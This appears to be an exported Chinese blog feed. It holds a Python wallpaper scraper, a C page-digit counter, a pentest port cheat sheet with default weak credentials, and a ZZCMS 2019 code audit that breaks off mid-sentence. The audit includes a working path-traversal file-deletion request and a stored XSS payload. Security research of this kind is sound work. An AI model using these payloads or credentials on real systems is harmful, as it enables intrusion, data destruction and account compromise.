WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: choice(USER_AGENTS)&#125;  <span class="comment"># 随机UA</span></span><br><span class="line"><span class="comment"># print(headers)</span></span><br><span class="line">folder_path = <span class="string">&#x27;./photo/&#x27;</span>  <span class="comment"># 保存的图片目录</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(folder_path) == <span class="literal">False</span>:  <span class="comment"># 判断文件夹是否已经存在</span></span><br><span class="line">    os.makedirs(folder_path)  <span class="comment"># 创建文件夹</span></span><br><span class="line">MAX_TIMEOUT = <span class="number">10</span> <span class="comment">#超时时间</span></span><br><span class="line"><span class="comment">#爬取图片的个数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999999</span>):</span><br><span class="line">    i = <span class="built_in">str</span>(i)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://wallpapers.wallhaven.cc/wallpapers/full/wallhaven-&quot;</span> + i + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">    img_name = folder_path + <span class="string">&#x27;wallhaven-&#x27;</span> + i + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># get函数获取图片链接地址，requests发送访问请求</span></span><br><span class="line">        html = requests.get(url, headers=headers,timeout=MAX_TIMEOUT)</span><br><span class="line">        <span class="comment"># responseCode=html.status_code</span></span><br><span class="line">        httpCode = <span class="built_in">str</span>(html.status_code)</span><br><span class="line">        <span class="comment"># print(html.status_code)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] 第 &#x27;</span> + i + <span class="string">&#x27; 张图片：&#x27;</span> + img_name + <span class="string">&#x27; 保存失败&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="comment"># print(html.text)</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(img_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:  <span class="comment"># 以byte形式将图片数据写入</span></span><br><span class="line">                file.write(html.content)</span><br><span class="line">                file.flush()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] &#x27;</span> + httpCode + <span class="string">&#x27; 第 &#x27;</span> + i + <span class="string">&#x27; 张图片：&#x27;</span>+img_name+<span class="string">&#x27; 保存完成&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] 第 &#x27;</span> + i + <span class="string">&#x27; 张图片：&#x27;</span>+img_name+<span class="string">&#x27; 保存失败，CODE:&#x27;</span> + httpCode)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>页码算法问题</title>
      <link href="/p/3fb0.html"/>
      <url>/p/3fb0.html</url>
      
        <content type="html"><![CDATA[<p>一道经典算法题</p><span id="more"></span><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><blockquote><p>给定一个十进制整数n，表示书的总页码数，计算书的页码中分别用到多少次数字0,1,2, ….,9。</p></blockquote><p>如输入:11<br>得到 :1,4,1,1,1,1,1,1,1,1<br>代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> input, i, m;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入总页数:\n&quot;</span>);</span><br><span class="line">scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= input; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> j = i;</span><br><span class="line"><span class="keyword">while</span> (j)</span><br><span class="line">&#123;</span><br><span class="line">a[j % <span class="number">10</span>]++;</span><br><span class="line">j = j / <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d  ------&gt; %d\n&quot;</span>, i, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>截图</p><p><img src="/images/ZNfTCeU.png"></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些常见端口总结</title>
      <link href="/p/e5ba.html"/>
      <url>/p/e5ba.html</url>
      
        <content type="html"><![CDATA[<p>整理下渗透中一些常见的端口</p><span id="more"></span><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><p>广义方面理解电脑端口大概分为三类：公认端口、注册端口、动态或私有端口。</p><h2 id="公认端口（0-1023）"><a href="#公认端口（0-1023）" class="headerlink" title="公认端口（0-1023）"></a><strong>公认端口（0-1023）</strong></h2><p>主要用来绑定一些系统种固定的应用服务，比如之前的WannaCry利用的445端口，它其实是用于局域网内信息流通数据的端口，通俗一点就是用于文及打印共享的，算是黑客最喜欢的端口之一。</p><h2 id="注册端口（1024-49151）"><a href="#注册端口（1024-49151）" class="headerlink" title="注册端口（1024-49151）"></a><strong>注册端口（1024-49151）</strong></h2><p>松散使用的服务端口，动态使用。</p><h2 id="动态或私有端口（49512-65535）"><a href="#动态或私有端口（49512-65535）" class="headerlink" title="动态或私有端口（49512-65535）"></a><strong>动态或私有端口（49512-65535）</strong></h2><p>理论上可以不存在的，不过很多厂商还是在一些特定的应用里任性使用，比如一些路由器、IOT类产品的调试。</p><h1 id="建议在为客户运维时BAN的端口"><a href="#建议在为客户运维时BAN的端口" class="headerlink" title="建议在为客户运维时BAN的端口"></a>建议在为客户运维时BAN的端口</h1><table><thead><tr><th>端口号</th><th align="center">功能及注意事项</th></tr></thead><tbody><tr><td>69</td><td align="center"><code>TFTP</code>小型文件传输协议使用的端口。</td></tr><tr><td>135</td><td align="center"><code>RPC</code>远程过程调用使用的端口号，可以用来远程代码执行。</td></tr><tr><td>137、138、139</td><td align="center"><code>NETBIOS</code>协议应用，在局域网中提供计算机的名字或IP地址查询服务以及文件共享服务，主要用为共享开放的。</td></tr><tr><td>445</td><td align="center">上面说了用于文及打印共享服务的端口。</td></tr><tr><td>593</td><td align="center">和135其实有点像，<code>DCOM</code>使用的端口号，也可以用来使用远程代码执行。</td></tr><tr><td>1025</td><td align="center">互联网信息服务应用端口，曾被<code>NetSPY</code>木马利用过。</td></tr></tbody></table><h1 id="服务运维需要注意的端口"><a href="#服务运维需要注意的端口" class="headerlink" title="服务运维需要注意的端口"></a>服务运维需要注意的端口</h1><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>110</td><td>用于<code>POP3</code>邮件服务器使用端口，需要就做访问限制，不需要就关</td></tr><tr><td>123</td><td>网络时间协议(<code>NTP</code>)，某些老蠕虫病毒曾利用过这个端口</td></tr><tr><td>1900</td><td><code>SDP Discovery Service</code>服务，关了可以勉强防止<code>DDOS</code></td></tr><tr><td>3306</td><td><code>MySQL</code>数据库通信的默认端口，建议更改为其他端口，不对外开放或仅对个别信任地址开放</td></tr><tr><td>1433、1434</td><td><code>MSSQL</code>数据库通信的默认端口，建议同3306</td></tr><tr><td>2638、5000、4100</td><td><code>Sybase</code>数据库通信的默认端口，建议同3306</td></tr><tr><td>1521</td><td><code>Oracle</code>数据库通信的默认端口，建议同3306</td></tr></tbody></table><h1 id="远程类"><a href="#远程类" class="headerlink" title="远程类"></a>远程类</h1><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>21</td><td>FTP服务端口，改成动态端口，做访问控制</td></tr><tr><td>22</td><td>SSH远程管理的默认端口，可利用远程执行代码、暴力密码破解、以及<code>DDOS</code>攻击，建议保持SSH版本为最新版本，更改成其他端口号，增强账户登录密码强度或更换为密钥登录，做访问控制</td></tr><tr><td>23</td><td>Telnet远程管理默认端口，没啥特殊用途就索性关了吧</td></tr><tr><td>3389</td><td>RDP远程桌面端口，建议同21</td></tr><tr><td>4899</td><td>Radmin软件远程管理通信端口，建议同21</td></tr><tr><td>5631</td><td>pcanywhere软件远程管理通信端口，建议同21</td></tr><tr><td>5900、5901</td><td>VNC软件远程管理通信端口，建议同21</td></tr><tr><td>6000</td><td>X-windows软件远程管理通信端口，建议同21</td></tr></tbody></table><h1 id="常见的默认端口"><a href="#常见的默认端口" class="headerlink" title="常见的默认端口"></a>常见的默认端口</h1><h2 id="1、web类-web漏洞-x2F-敏感目录"><a href="#1、web类-web漏洞-x2F-敏感目录" class="headerlink" title="1、web类(web漏洞&#x2F;敏感目录)"></a>1、web类(web漏洞&#x2F;敏感目录)</h2><p>第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix …</p><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>80</td><td>web</td></tr><tr><td>80-89</td><td>web</td></tr><tr><td>8000-9090</td><td>web</td></tr></tbody></table><h2 id="2、数据库类-扫描弱口令"><a href="#2、数据库类-扫描弱口令" class="headerlink" title="2、数据库类(扫描弱口令)"></a>2、数据库类(扫描弱口令)</h2><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>1433</td><td>MSSQL</td></tr><tr><td>1521</td><td>Oracle</td></tr><tr><td>3306</td><td>MySQL</td></tr><tr><td>5432</td><td>PostgreSQL</td></tr><tr><td>50000</td><td>DB2</td></tr></tbody></table><h2 id="3、特殊服务类-未授权-x2F-命令执行类-x2F-漏洞"><a href="#3、特殊服务类-未授权-x2F-命令执行类-x2F-漏洞" class="headerlink" title="3、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)"></a>3、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)</h2><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>443</td><td>SSL心脏滴血</td></tr><tr><td>445</td><td>ms08067&#x2F;ms11058&#x2F;ms17010等</td></tr><tr><td>873</td><td>Rsync未授权</td></tr><tr><td>5984</td><td>CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></td></tr><tr><td>6379</td><td>redis未授权</td></tr><tr><td>7001,7002</td><td>WebLogic默认弱口令，反序列</td></tr><tr><td>9200,9300</td><td>elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</td></tr><tr><td>11211</td><td>memcache未授权访问</td></tr><tr><td>27017,27018</td><td>Mongodb未授权访问</td></tr><tr><td>50000</td><td>SAP命令执行</td></tr><tr><td>50070,50030</td><td>hadoop默认端口未授权访问</td></tr></tbody></table><h2 id="4、常用端口类-扫描弱口令-x2F-端口爆破"><a href="#4、常用端口类-扫描弱口令-x2F-端口爆破" class="headerlink" title="4、常用端口类(扫描弱口令&#x2F;端口爆破)"></a>4、常用端口类(扫描弱口令&#x2F;端口爆破)</h2><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>21</td><td>ftp</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Telnet</td></tr><tr><td>445</td><td>SMB弱口令扫描、MS08-067、MS17-010</td></tr><tr><td>2601,2604</td><td>zebra路由，默认密码zebra</td></tr><tr><td>3389</td><td>远程桌面</td></tr></tbody></table><h2 id="5、端口合计所对应的服务"><a href="#5、端口合计所对应的服务" class="headerlink" title="5、端口合计所对应的服务"></a>5、端口合计所对应的服务</h2><table><thead><tr><th>端口</th><th>功能及注意事项</th></tr></thead><tbody><tr><td>21</td><td>ftp</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Telnet</td></tr><tr><td>25</td><td>SMTP</td></tr><tr><td>53</td><td>DNS</td></tr><tr><td>69</td><td>TFTP</td></tr><tr><td>80</td><td>web</td></tr><tr><td>80-89</td><td>web</td></tr><tr><td>110</td><td>POP3</td></tr><tr><td>135</td><td>RPC</td></tr><tr><td>139</td><td>NETBIOS</td></tr><tr><td>143</td><td>IMAP</td></tr><tr><td>161</td><td>SNMP</td></tr><tr><td>389</td><td>LDAP</td></tr><tr><td>443</td><td>SSL心脏滴血以及一些web漏洞测试</td></tr><tr><td>445</td><td>SMB</td></tr><tr><td>512,513,514</td><td>Rexec</td></tr><tr><td>873</td><td>Rsync未授权</td></tr><tr><td>1025,111</td><td>NFS</td></tr><tr><td>1080</td><td>socks</td></tr><tr><td>1158</td><td>ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案</td></tr><tr><td>1433</td><td>MSSQL (暴力破解)</td></tr><tr><td>1521</td><td>Oracle:(iSqlPlus Port:5560,7778)</td></tr><tr><td>2082&#x2F;2083</td><td>cpanel主机管理系统登陆 （国外用较多）</td></tr><tr><td>2222</td><td>DA虚拟主机管理系统登陆 （国外用较多）</td></tr><tr><td>2601,2604</td><td>zebra路由，默认密码zebra</td></tr><tr><td>3128</td><td>squid代理默认端口，如果没设置口令很可能就直接漫游内网了</td></tr><tr><td>3306</td><td>MySQL （暴力破解）</td></tr><tr><td>3312&#x2F;3311</td><td>kangle主机管理系统登陆</td></tr><tr><td>3389</td><td>远程桌面</td></tr><tr><td>3690</td><td>svn</td></tr><tr><td>4440</td><td>rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</td></tr><tr><td>4848</td><td>GlassFish web中间件 弱口令:admin&#x2F;adminadmin</td></tr><tr><td>5432</td><td>PostgreSQL</td></tr><tr><td>5900</td><td>vnc</td></tr><tr><td>5984</td><td>CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></td></tr><tr><td>6082</td><td>varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</td></tr><tr><td>6379 r</td><td>edis未授权</td></tr><tr><td>7001,7002</td><td>WebLogic默认弱口令，反序列</td></tr><tr><td>7778</td><td>Kloxo主机控制面板登录</td></tr><tr><td>8000-9090</td><td>都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上</td></tr><tr><td>8080</td><td>tomcat&#x2F;WDCd&#x2F; 主机管理系统，默认弱口令</td></tr><tr><td>8080,8089,9090</td><td>JBOSS</td></tr><tr><td>8081</td><td>Symantec AV&#x2F;Filter for MSE</td></tr><tr><td>8083</td><td>Vestacp主机管理系统 （国外用较多）</td></tr><tr><td>8649</td><td>ganglia</td></tr><tr><td>8888</td><td>amh&#x2F;LuManager 主机管理系统默认端口</td></tr><tr><td>9000</td><td>fcgi fcig php执行</td></tr><tr><td>9043</td><td>websphere[web中间件] 弱口令: admin&#x2F;admin websphere&#x2F; websphere ststem&#x2F;manager</td></tr><tr><td>9200,9300</td><td>elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</td></tr><tr><td>10000</td><td>Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统</td></tr><tr><td>11211</td><td>memcache未授权访问</td></tr><tr><td>27017,27018</td><td>Mongodb未授权访问</td></tr><tr><td>28017</td><td>mongodb统计页面</td></tr><tr><td>50000</td><td>SAP命令执行</td></tr><tr><td>50060</td><td>hadoop</td></tr><tr><td>50070 50030</td><td>hadoop默认端口未授权访问</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZZCMS2019版 代码审计记录</title>
      <link href="/p/9812.html"/>
      <url>/p/9812.html</url>
      
        <content type="html"><![CDATA[<p>ZZCMS2019版本代码审计记录</p><span id="more"></span><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>官网下载<a href="http://www.zzcms.net/about/6.htm">http://www.zzcms.net/about/6.htm</a></p><h1 id="重装漏洞"><a href="#重装漏洞" class="headerlink" title="重装漏洞"></a>重装漏洞</h1><p><code>step1.php</code>中会检测是否存在<code>install.lock</code>，存在则显示已经安装过，否则跳出判断，执行正常安装</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;install.lock&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27;padding:30px;&#x27;&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/IwcYFcO.png"></p><p>但是该判断只在<code>step1.php</code>中存在，<code>step2.php,step3.php,step4.php</code>均不存在该代码</p><p><img src="/images/3Uu0tpL.png" alt="step2.php"></p><p><code>step3.php</code>中设置了<code>token</code>，计算方式是：使用<code>rand()</code>生成一个随机数，然后以这个随机数作为前缀生成23位的唯一<code>ID</code>，然后再进行<code>md5</code>加密确保唯一性。</p><blockquote><p><code>uniqid(prefix,more_entropy)</code>函数基于以微秒计的当前时间，生成一个唯一的 ID。</p><p>如果 <code>prefix </code>参数为空，则返回的字符串有 13 个字符串长。如果 <code>more_entropy</code>参数设置为 true，则是 23 个字符串长。</p><p>如果<code>more_entropy</code> 参数设置为 true，则在返回值的末尾添加额外的熵（使用组合线形同余数生成程序），这样可以结果的唯一性更好。</p></blockquote><p><img src="/images/rSPg1hK.png" alt="step3.php"></p><p><code>index.php</code>中定义了<code>$step</code>变量获取方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">session_cache_limiter</span>(<span class="string">&#x27;private, must-revalidate&#x27;</span>);  <span class="comment">//为了支持返回上一步页面回跳,//要放在session_start之前</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;<span class="title function_ invoke__">session_start</span>();&#125; </span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="comment">//set_magic_quotes_runtime(0);//5.3后已不在支持</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../inc/config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>, EXTR_SKIP);<span class="comment">//把数组中的键名直接注册为了变量。就像把$_POST[ai]直接注册为了$ai。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="variable">$submit</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$step</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] : <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>因此重装漏洞可以通过<code>post</code><strong>step</strong>值进行触发</p><p><img src="/images/Mn1ZkmD.png"></p><h1 id="后台任意文件删除"><a href="#后台任意文件删除" class="headerlink" title="后台任意文件删除"></a>后台任意文件删除</h1><p>前提：需要后台权限</p><p>漏洞位置:<code>/admin/dl_data.php</code>第12行开始</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&quot;del&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$fp</span> = <span class="string">&quot;../dl_excel/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;请选择要删除的标签&#x27;);history.back()&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>$_GET[&quot;filename&quot;]</code>直接get方式取得<code>filename</code>，没有经过过滤，导致可跨目录任意删除文件</p><p>Payload:</p><blockquote><p>GET &#x2F;admin&#x2F;dl_data.php?action&#x3D;del&amp;filename&#x3D;..&#x2F;robots.txt HTTP&#x2F;1.1<br>Host: <a href="http://www.zzcms2019.cc/">www.zzcms2019.cc</a><br>Proxy-Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;72.0.3626.109 Safari&#x2F;537.36<br>DNT: 1<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Cookie: PHPSESSID&#x3D;pfaouuq82dnb11vske0ahqr7f2; admin&#x3D;admin; pass&#x3D;21232f297a57a5a743894a0e4a801fc3; tablename&#x3D;zzcms_zsclass</p></blockquote><p>访问后，根目录下的<code>robots.txt</code>已被删除</p><h1 id="存储型XSS（CVE-2019-9078）"><a href="#存储型XSS（CVE-2019-9078）" class="headerlink" title="存储型XSS（CVE-2019-9078）"></a>存储型XSS（CVE-2019-9078）</h1><p>细读了下源码，发现在<code>/user/ask.php</code>中存在<code>modify()</code>函数,部分代码如下</p><p>以<code>get</code>方法获取<code>do</code>参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$do</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]:<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$do</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;add&quot;</span>:<span class="title function_ invoke__">add</span>();<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;modify&quot;</span>:<span class="title function_ invoke__">modify</span>();<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>modify()</code>函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">modify</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$username</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">admintitle</span>&quot;&gt;修改问答信息&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">$<span class="title">page</span> = <span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;])?$<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;]:1;</span></span><br><span class="line"><span class="class">    <span class="title">checkid</span>($<span class="title">page</span>);</span></span><br><span class="line"><span class="class">    $<span class="title">id</span> = <span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">id</span>&#x27;])?$<span class="title">_GET</span>[&#x27;<span class="title">id</span>&#x27;]:0;</span></span><br><span class="line"><span class="class">    <span class="title">checkid</span>($<span class="title">id</span>, 1);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    $<span class="title">sqlzx</span>=&quot;<span class="title">select</span> * <span class="title">from</span> <span class="title">zzcms_ask</span> <span class="title">where</span> <span class="title">id</span>=&#x27;$<span class="title">id</span>&#x27;&quot;;</span></span><br><span class="line"><span class="class">    $<span class="title">rszx</span> =<span class="title">query</span>($<span class="title">sqlzx</span>);</span></span><br><span class="line"><span class="class">    $<span class="title">rowzx</span> = <span class="title">fetch_array</span>($<span class="title">rszx</span>);</span></span><br><span class="line"><span class="class">    <span class="title">if</span> ($<span class="title">id</span>&lt;&gt;0 &amp;&amp; $<span class="title">rowzx</span>[&quot;<span class="title">editor</span>&quot;]&lt;&gt;$<span class="title">username</span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">markit</span>();</span><br><span class="line">        <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;非法操作！警告：你的操作已被记录！小心封你的用户及IP！&#x27;</span>);</span><br><span class="line">    &#125; <span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>其中调用了存在问题的函数<code>markit()</code></p><p>函数所在文件<code>/inc/function.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//$_SERVER[&#x27;HTTP_REFERER&#x27;];//上页来源</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">markit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$userip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">    <span class="comment">//$userip=getip();</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&quot;http://&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>] . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">query</span>(<span class="string">&quot;insert into zzcms_bad (username,ip,dose,sendtime)values(&#x27;&quot;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&quot;UserName&quot;</span>] . <span class="string">&quot;&#x27;,&#x27;<span class="subst">$userip</span>&#x27;,&#x27;<span class="subst">$url</span>&#x27;,&#x27;&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&quot;&#x27;)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>$url</code>没有经过过滤，直接插入数据库，因此我们可以注册一个用户，访问 <code>http://www.zzcms2019.cc/user/ask.php?do=modify&amp;page=1&amp;id=1</code>，会出现</p><p><img src="/images/5JxxULl.png"></p><p>这时我们可以用Burpsuite抓包，修改包体的URI路径为<code>/user/ask.php?do=modify&amp;page=1&amp;id=1&amp;aaa=&lt;sCrIpT&gt;alert(/xss/)&lt;/ScRiPt&gt; 